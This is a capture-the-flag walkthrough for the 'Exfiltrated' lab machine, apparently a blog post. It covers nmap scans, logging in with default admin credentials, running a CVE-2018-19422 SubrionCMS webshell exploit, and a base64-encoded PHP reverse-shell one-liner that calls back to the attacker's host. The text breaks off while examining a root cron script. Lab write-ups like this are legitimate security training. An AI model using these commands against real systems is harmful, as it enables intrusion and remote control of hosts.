{"componentChunkName":"component---src-templates-post-template-tsx","path":"/240910/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h2>1.Recon</h2>\n<p>Starting with nmap</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~/pg/exfiltrated]\r\n└─$ sudo nmap 192.168.157.163 -p- -T4 \r\n[sudo] password for hosan: \r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 14:11 EDT\r\nNmap scan report for 192.168.157.163\r\nHost is up (0.039s latency).\r\nNot shown: 65533 closed tcp ports (reset)\r\nPORT   STATE SERVICE\r\n22/tcp open  ssh\r\n80/tcp open  http\r\n\r\nNmap done: 1 IP address (1 host up) scanned in 19.99 seconds\r\n</code></pre></div>\n<p>Port 22:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">└─$ sudo nmap 192.168.157.163 -p22 -T4 -A -sC -sV\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 14:12 EDT\r\nNmap scan report for 192.168.157.163\r\nHost is up (0.033s latency).\r\n\r\nPORT   STATE SERVICE VERSION\r\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)\r\n| ssh-hostkey: \r\n|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)\r\n|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)\r\n|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nAggressive OS guesses: Linux 2.6.18 (87%), Linux 4.15 - 5.8 (87%), Linux 5.0 (87%), Linux 5.0 - 5.4 (87%), Linux 2.6.32 (87%), Linux 2.6.32 or 3.10 (87%), Linux 2.6.39 (87%), Linux 3.10 - 3.12 (87%), Linux 3.4 (87%), Linux 3.5 (87%)\r\nNo exact OS matches for host (test conditions non-ideal).\r\nNetwork Distance: 4 hops\r\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\r\n</code></pre></div>\n<p>Port 80:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~/pg/exfiltrated]\r\n└─$ sudo nmap 192.168.157.163 -p80 -T4 -A -sC -sV\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 14:12 EDT\r\nNmap scan report for 192.168.157.163\r\nHost is up (0.029s latency).\r\n\r\nPORT   STATE SERVICE VERSION\r\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\r\n|_http-server-header: Apache/2.4.41 (Ubuntu)\r\n| http-robots.txt: 7 disallowed entries \r\n| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ \r\n|_/updates/\r\n|_http-title: Did not follow redirect to http://exfiltrated.offsec/\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nAggressive OS guesses: Linux 2.6.18 (87%), Linux 4.15 - 5.8 (87%), Linux 5.0 (87%), Linux 5.0 - 5.4 (87%), Linux 2.6.32 (87%), Linux 2.6.32 or 3.10 (87%), Linux 2.6.39 (87%), Linux 3.10 - 3.12 (87%), Linux 3.4 (87%), Linux 3.7 (87%)\r\nNo exact OS matches for host (test conditions non-ideal).</code></pre></div>\n<p>Let’s add exfilterated.offsec to /etc/hosts and continue.</p>\n<h2>2. Enumeration</h2>\n<p>Since ssh has nothing special, we’ll focus on webapp enumeration</p>\n<h4>2.1 Webapp enumeration</h4>\n<p>index page:\r\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/100687a0435dc84798cb4768b9db3e23/d3b48/1.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 65.625%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAC1ElEQVR42p2T204bVxSG55GqJjgEe3w22B4848PYYw82PoGMU5s0QMEoIRALQUl70RaUQisg6nvxAFWr9IIGbAP9umanva7ULf36196a9a/jaNVGl/riEu5CC7voUnJqCk6lgV1uUChWyeYr/wkrV1asIef+/p77uzvFDw8P/J/z1z9+2p0I/f7br1xdXfHhwx+MRmMFL8BkMmHisYfRiDvBaDLm+uaGP6+vGd3ecvPxI7dyvxV7PB6jtdrLNBptGs0l6o0lmh7X22z2e/x0MOT9yfdcnF9yef4LF8c/cHlyzOXpKRfC56c/c/bdCe92tnj/7pizH8/QHk895dHjaXy+GaaU/RTv7bPPfWSiUdZqFTa/2uX1y12+frnB4XDIwf4B+/tHvNk7ZNDf4HkqwXazxnD9BZoejBIMxQiF4kQiCfRgjKAHeZvxhwgEIpSKNXoVh0E1x9H2Om93d/hmb49vD9+y/eUWTjzJaqnATmcZzXOMRGaVWCT8r2hU2WEJMhMIMzPtxzUtNp71WK0UGbh5Xjdd9l+sMuj1MNIWlWSahi1TjsaSGEaWfN4RlCgWK4rT8lHWKpDL2kSiczzyBWi3uxwMj/iiVmMlk6Jv53jzrMuy2yBXqlFvddESswYZ06Zgyw6WqgoFETfms0o0Y3hsoutRnkzrbG6+orOySjpl4ph5HMvGkV1d7vRpSUAtljAwMgW1zOVKnYpEcxeakqlLTLIPBWOqDUE9pgTnkhnW1gfkC1KJvYBbbdPpPld+RspCi4tgKp0jK5tuFxdEeBGnvEhZYFlFlZkn6PXTs6d8fnGu0+utUa22VBssqdBImgpaLJ6WqHIx8phmUQnn8l4f5ZfKOipLJRqWYUmWgcCn0jsrfbak/IyRIz2XkexMJSxDSZGYzZBMZZmfL2CJiCdqZUvCjvTKUqvkrVU49Kl0v6ySX6afiKeIycB0PUJUOKBH+RsP+1oC9AIt2QAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/100687a0435dc84798cb4768b9db3e23/a59e9/1.webp 192w,\n/static/100687a0435dc84798cb4768b9db3e23/0ca9f/1.webp 384w,\n/static/100687a0435dc84798cb4768b9db3e23/dc9b9/1.webp 768w,\n/static/100687a0435dc84798cb4768b9db3e23/e2c2f/1.webp 1152w,\n/static/100687a0435dc84798cb4768b9db3e23/f0eed/1.webp 1340w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/100687a0435dc84798cb4768b9db3e23/3b721/1.png 192w,\n/static/100687a0435dc84798cb4768b9db3e23/66595/1.png 384w,\n/static/100687a0435dc84798cb4768b9db3e23/fe486/1.png 768w,\n/static/100687a0435dc84798cb4768b9db3e23/d2d74/1.png 1152w,\n/static/100687a0435dc84798cb4768b9db3e23/d3b48/1.png 1340w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/100687a0435dc84798cb4768b9db3e23/fe486/1.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>footer:\r\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/10e7478273815a2c9ee9f4d6ae60ece3/7644a/2.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.875%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABCUlEQVR42pWN3WqDUBCEz8P4F4wPoGLUqCCJ5Db+gE+lydO1uQghlzHSCymSaXepcGjSpj3wwc7Mzh6BJ28cR1y6DpfrFbfb7dk6xND36F5f0B0O6I9HvJ3Pd/SnE/Mok3kfBgj84df/PNG0Ldrd7nf2+x+zRp6bBkLXNBiGAU1VoSgKo+s6e6rkkZ7NZpyRr332SBPUVb8Qy+USm80G6/UaWZYhDEMkScLearVCmqYIgoBn2iHIoz3Zozu2bUMsFgs+QMRxDNd1+QBpKvm+D8/zEEUR+5N2HAfUnaAeH5zP55CxLIv57pumebcn70+IPM9RVRXKsmRoljXl2+32IZRNnbquURQFPgCrjsxwkz4fNgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/10e7478273815a2c9ee9f4d6ae60ece3/a59e9/2.webp 192w,\n/static/10e7478273815a2c9ee9f4d6ae60ece3/0ca9f/2.webp 384w,\n/static/10e7478273815a2c9ee9f4d6ae60ece3/dc9b9/2.webp 768w,\n/static/10e7478273815a2c9ee9f4d6ae60ece3/e2c2f/2.webp 1152w,\n/static/10e7478273815a2c9ee9f4d6ae60ece3/e14cd/2.webp 1233w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/10e7478273815a2c9ee9f4d6ae60ece3/3b721/2.png 192w,\n/static/10e7478273815a2c9ee9f4d6ae60ece3/66595/2.png 384w,\n/static/10e7478273815a2c9ee9f4d6ae60ece3/fe486/2.png 768w,\n/static/10e7478273815a2c9ee9f4d6ae60ece3/d2d74/2.png 1152w,\n/static/10e7478273815a2c9ee9f4d6ae60ece3/7644a/2.png 1233w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/10e7478273815a2c9ee9f4d6ae60ece3/fe486/2.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>It is impossible to do subdirectory enumeration since this is sso application. Let’s continue with vhost enumeration.</p>\n<p>there was /login endpoint, and I could log in with admin:admin</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/8b57179873fe924c46fb7461990b7b20/b989c/3.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 61.979166666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA/ElEQVR42q1Ty2rDMBDU/39Xr731VGyCSxxcEluKo/drsusk0B7ilroDg3YRGo12V0LJEU3TQEqJUgrWUGtFCAHee8QYkXOGtXaJH7kIMSBQUijhA8/Il63tPygy3RxTWtS/CdzJ8VeHa2QI/AB+yul4hJwm/AaCnXFNlFIwxiCR208d0Iwau8ngQzn0s194uMRVplJvgsMwoG1bdF0H5yx8LrjEAk00RJvqQnPPn5H0INgRd3jWBlJJEnTYAhGpy2etcZgNRhJ1NAabBPnJXHgeHU8zxvFmQW4Gr/8BwY72fQ9N9XvTBe/29lvqXwX5B/BgAwUvMuF1zpsEr6SzsZDgIln4AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/8b57179873fe924c46fb7461990b7b20/a59e9/3.webp 192w,\n/static/8b57179873fe924c46fb7461990b7b20/0ca9f/3.webp 384w,\n/static/8b57179873fe924c46fb7461990b7b20/dc9b9/3.webp 768w,\n/static/8b57179873fe924c46fb7461990b7b20/e2c2f/3.webp 1152w,\n/static/8b57179873fe924c46fb7461990b7b20/477d4/3.webp 1224w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/8b57179873fe924c46fb7461990b7b20/3b721/3.png 192w,\n/static/8b57179873fe924c46fb7461990b7b20/66595/3.png 384w,\n/static/8b57179873fe924c46fb7461990b7b20/fe486/3.png 768w,\n/static/8b57179873fe924c46fb7461990b7b20/d2d74/3.png 1152w,\n/static/8b57179873fe924c46fb7461990b7b20/b989c/3.png 1224w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/8b57179873fe924c46fb7461990b7b20/fe486/3.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>And we have this page\r\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/87978fbf150052472071803dc81553ac/19afb/4.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 69.79166666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABlklEQVR42o2T607CQBCFeSMNIDGgiL/Ux9U3QP9ACwVa1MQQg9xKSgLSlu29x9mm5VrASb7Msi1nz8xOM6XyAyqVR1Tun3BdrCB3dYv81Q3yhTJyhTtkKV9kiztc5ohsDF/nShH8WaajfECo1fBWfYVYF6DICuSODFnuot3potWW0ZTaa8RGC4LQQF2UIDbbqNNaEBu03yQkZEChmzp+phoWzIYVAj7tBUGAMAyxH3yPE/C89TuBBEPMmYdPzcT3nOFrZkAzHTi2DZvwPO8A3/fhb6+JZB055G5MwwBjbO3KjgWR4oK/n0bsEHBdF4PBAMPhEOPxGI7jwDTN6ACeDTosyavVCrquY7lcRq74fxN2BCeTCUajETRNi07bLmW/3ETgpMN+v49erwdVVY9eyLlYC0Y9pJI4vFycuOVTYmvBtHBc3h8v9ZbTSFpwVNCzGALXpp5t+nnsdg96uGM9zu8LBmVhUe2bGft3D7cjiBWfpwwvKiOrDqx4Jk9hWdZmsA8dhqjOGCT6ahxDxy/NnX4GPpe8j38z1hLUnqd+VAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/87978fbf150052472071803dc81553ac/a59e9/4.webp 192w,\n/static/87978fbf150052472071803dc81553ac/0ca9f/4.webp 384w,\n/static/87978fbf150052472071803dc81553ac/dc9b9/4.webp 768w,\n/static/87978fbf150052472071803dc81553ac/e2c2f/4.webp 1152w,\n/static/87978fbf150052472071803dc81553ac/7e666/4.webp 1287w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/87978fbf150052472071803dc81553ac/3b721/4.png 192w,\n/static/87978fbf150052472071803dc81553ac/66595/4.png 384w,\n/static/87978fbf150052472071803dc81553ac/fe486/4.png 768w,\n/static/87978fbf150052472071803dc81553ac/d2d74/4.png 1152w,\n/static/87978fbf150052472071803dc81553ac/19afb/4.png 1287w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/87978fbf150052472071803dc81553ac/fe486/4.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/a3755bb51b0692394a13e932a6fd3803/f27d8/5.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.45833333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAf0lEQVR42q2QQQ7CMAwE8/9X0V+UJyCkiAjZieM429pw4gS0llb2aTTeJCKotWLOiTMm9d7RWoOZBfRoksOY+Tygw4godI/CXCp5fzlnjDFePX4Gf7xcSgm6Q5sapFvs9t5mPxiq6t5hxVDB7f7EshKWK+8hXOImPHiEqX1huAFNgSiN6U36XwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/a3755bb51b0692394a13e932a6fd3803/a59e9/5.webp 192w,\n/static/a3755bb51b0692394a13e932a6fd3803/0ca9f/5.webp 384w,\n/static/a3755bb51b0692394a13e932a6fd3803/dc9b9/5.webp 768w,\n/static/a3755bb51b0692394a13e932a6fd3803/ec48d/5.webp 847w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/a3755bb51b0692394a13e932a6fd3803/3b721/5.png 192w,\n/static/a3755bb51b0692394a13e932a6fd3803/66595/5.png 384w,\n/static/a3755bb51b0692394a13e932a6fd3803/fe486/5.png 768w,\n/static/a3755bb51b0692394a13e932a6fd3803/f27d8/5.png 847w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/a3755bb51b0692394a13e932a6fd3803/fe486/5.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>Time to search for cve</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~/pg/exfiltrated]\r\n└─$ searchsploit subrion  \r\n------------------------------------------ ---------------------------------\r\nSubrion 3.x - Multiple Vulnerabilities                                                        | php/webapps/38525.txt\r\nSubrion 4.2.1 - 'Email' Persistant Cross-Site Scripting                                       | php/webapps/47469.txt\r\nSubrion Auto Classifieds - Persistent Cross-Site Scripting                                    | php/webapps/14391.txt\r\nSUBRION CMS - Multiple Vulnerabilities                                                        | php/webapps/17390.txt\r\nSubrion CMS 2.2.1 - Cross-Site Request Forgery (Add Admin)                                    | php/webapps/21267.txt\r\nsubrion CMS 2.2.1 - Multiple Vulnerabilities                                                  | php/webapps/22159.txt\r\nSubrion CMS 4.0.5 - Cross-Site Request Forgery (Add Admin)                                    | php/webapps/47851.txt\r\nSubrion CMS 4.0.5 - Cross-Site Request Forgery Bypass / Persistent Cross-Site Scripting       | php/webapps/40553.txt\r\nSubrion CMS 4.0.5 - SQL Injection                                                             | php/webapps/40202.txt\r\nSubrion CMS 4.2.1 - 'avatar[path]' XSS                                                        | php/webapps/49346.txt\r\nSubrion CMS 4.2.1 - Arbitrary File Upload                                                     | php/webapps/49876.py\r\nSubrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin)                              | php/webapps/50737.txt\r\nSubrion CMS 4.2.1 - Cross-Site Scripting                                                      | php/webapps/45150.txt\r\nSubrion CMS 4.2.1 - Stored Cross-Site Scripting (XSS)                                         | php/webapps/51110.txt\r\n---------------------------------------------------------------------------------------------- ---------------------------------</code></pre></div>\n<p>So there is File Upload vuln, maybe we can use it.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/5fa8aef63c113db442236aa581fa3ce2/4bff0/6.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.25%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABvUlEQVR42p2R30tTYRjHz18QdGNz89emm7km2kkZCquLmRSRsIs5uyioiyDopiuhKyHSiWgXLYruBZH+hSDoIoKUILyQTTTHcuecuc7OPDuSRz++R8XSi/D4wIfn/fK+fN735ZEGBu8QvzlEPH6b6zduERtKEHtwn757I0RHhukdTtKTSiEnk3QlEv+lWyCF2i8TCEYIdnTjqWsm9XyU16vfmVn6Qia7wJucwyIZ0Z2cyX476qfX4lx2EcnjbSEckYkP3qVL7uPd2/fYVQNLL8POH3ZrFrZpsWPWsGtOP8R28vH6L5KvJUhPNMaTp894+Ogxs3Mf+PxDZf7TCh8XfrJWUFG0EqqmoZVKbJTKFEVWRFacrIr9f5Da5aj47lVCYZkLF+sZe5Emt2HydanA8vomummzu8eZS2psDtIa6hTf7cfjCzAxOU25us1KXuGX9hu3JfmaAmIoVwh39nLJ62dcCNWKxfJakbxSZs+tsKGpFX9bmI7ItUNh2hFuC6EihOd5YeNJ4cv0FOqmTm41z3qhiK7rrhBTbjsW1tX7mZyaObjJqFQwt7YwDMMVkrfBf0r46kBYFbKaZWG5ZB+vPrSP3gAtjQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/5fa8aef63c113db442236aa581fa3ce2/a59e9/6.webp 192w,\n/static/5fa8aef63c113db442236aa581fa3ce2/0ca9f/6.webp 384w,\n/static/5fa8aef63c113db442236aa581fa3ce2/dc9b9/6.webp 768w,\n/static/5fa8aef63c113db442236aa581fa3ce2/e2c2f/6.webp 1152w,\n/static/5fa8aef63c113db442236aa581fa3ce2/f3efb/6.webp 1536w,\n/static/5fa8aef63c113db442236aa581fa3ce2/23703/6.webp 1581w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/5fa8aef63c113db442236aa581fa3ce2/3b721/6.png 192w,\n/static/5fa8aef63c113db442236aa581fa3ce2/66595/6.png 384w,\n/static/5fa8aef63c113db442236aa581fa3ce2/fe486/6.png 768w,\n/static/5fa8aef63c113db442236aa581fa3ce2/d2d74/6.png 1152w,\n/static/5fa8aef63c113db442236aa581fa3ce2/e8464/6.png 1536w,\n/static/5fa8aef63c113db442236aa581fa3ce2/4bff0/6.png 1581w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/5fa8aef63c113db442236aa581fa3ce2/fe486/6.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>After reading and visiting the site here, indeed, this is version 4.2.1 which should be vulnerable.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/7b8fc502ff1fe0b8586b9aca0a82f648/e3807/7.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.958333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA0ElEQVR42m2P207DMBBE8/+/xCcg9QUhXioQzcWN7cbr+BoJe7oOUKHStY5mPTMv2w3DCEsrctqQYv5HjOnGfZYZFyLkujIO5D26Xr9DuzMu/jE2SLioYMIMfZdpL3ZPOQHJLF6hO5kJp2XEJ9P2nhpi90Y643k+4ml4xYv8wNT8n3ywgnN52/sG97t2ymUxiCljlgrOB6S87f/MKp3jMmEyGmYlEFlIqaEWjTdxwMxKfK5UGsIadOCpteKvPpr6+7hTS0GpX9hKYC3fHkM54grS834ST+wFTAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/7b8fc502ff1fe0b8586b9aca0a82f648/a59e9/7.webp 192w,\n/static/7b8fc502ff1fe0b8586b9aca0a82f648/0ca9f/7.webp 384w,\n/static/7b8fc502ff1fe0b8586b9aca0a82f648/dc9b9/7.webp 768w,\n/static/7b8fc502ff1fe0b8586b9aca0a82f648/e2c2f/7.webp 1152w,\n/static/7b8fc502ff1fe0b8586b9aca0a82f648/90a49/7.webp 1517w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/7b8fc502ff1fe0b8586b9aca0a82f648/3b721/7.png 192w,\n/static/7b8fc502ff1fe0b8586b9aca0a82f648/66595/7.png 384w,\n/static/7b8fc502ff1fe0b8586b9aca0a82f648/fe486/7.png 768w,\n/static/7b8fc502ff1fe0b8586b9aca0a82f648/d2d74/7.png 1152w,\n/static/7b8fc502ff1fe0b8586b9aca0a82f648/e3807/7.png 1517w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/7b8fc502ff1fe0b8586b9aca0a82f648/fe486/7.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>So I added the member with admin:admin (to be sure) then executed the cve</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~/pg/exfiltrated/CVE-2018-19422-SubrionCMS-RCE]\r\n└─$ python3 SubrionRCE.py -u http://exfiltrated.offsec/panel/ -l admin -p admin\r\n[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 \r\n\r\n[+] Trying to connect to: http://exfiltrated.offsec/panel/\r\n[+] Success!\r\n[+] Got CSRF token: c1MUFsfy6KZ6qep36fZitvhrocirAdSW8mf8fOcL\r\n[+] Trying to log in...\r\n[+] Login Successful!\r\n\r\n[+] Generating random name for Webshell...\r\n[+] Generated webshell name: qltfwzcbozjgzkw\r\n\r\n[+] Trying to Upload Webshell..\r\n[+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/qltfwzcbozjgzkw.phar \r\n\r\n$ ls /home\r\ncoaran\r\n\r\n$ cat /home/coaran/local.txt\r\naaaa1896196e4b2544127cb5a58e4978\r\n\r\n$ </code></pre></div>\n<p>That’s it for initial foothold</p>\n<h2>3. Privesc</h2>\n<p>Used classic method for revshell</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\"> echo cGhwIC1yICckc29jaz1mc29ja29wZW4oIjE5Mi4xNjguNDUuMjI0Iiw4MCk7ZXhlYygic2ggPCYzID4mMyAyPiYzIik7Jw== | base64 --decode\r\n--------------------------------------------\r\nbash -i\r\nbash: cannot set terminal process group (982): Inappropriate ioctl for device\r\nbash: no job control in this shell\r\nwww-data@exfiltrated:/var/www/html/subrion/uploads$ \r\n</code></pre></div>\n<p>Now downloaded linpeas.py</p>\n<p>Hmm nothing interesting?</p>\n<p>Downloaded pspy64</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">2024/09/07 19:02:01 CMD: UID=0    PID=33016  | bash /opt/image-exif.sh \r\n2024/09/07 19:02:01 CMD: UID=0    PID=33015  | bash /opt/image-exif.sh \r\n2024/09/07 19:02:01 CMD: UID=0    PID=33014  | /bin/sh -c bash /opt/image-exif.sh \r\n2024/09/07 19:02:01 CMD: UID=0    PID=33013  | /usr/sbin/CRON -f </code></pre></div>\n<p>Interesting image-exif.sh script is there.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">www-data@exfiltrated:/opt$ cat image-exif.sh\r\ncat image-exif.sh\r\n#! /bin/bash\r\n#07/06/18 A BASH script to collect EXIF metadata \r\n\r\necho -ne \"\\\\n metadata directory cleaned! \\\\n\\\\n\"\r\n\r\n\r\nIMAGES='/var/www/html/subrion/uploads'\r\n\r\nMETA='/opt/metadata'\r\nFILE=`openssl rand -hex 5`\r\nLOGFILE=\"$META/$FILE\"\r\n\r\necho -ne \"\\\\n Processing EXIF metadata now... \\\\n\\\\n\"\r\nls $IMAGES | grep 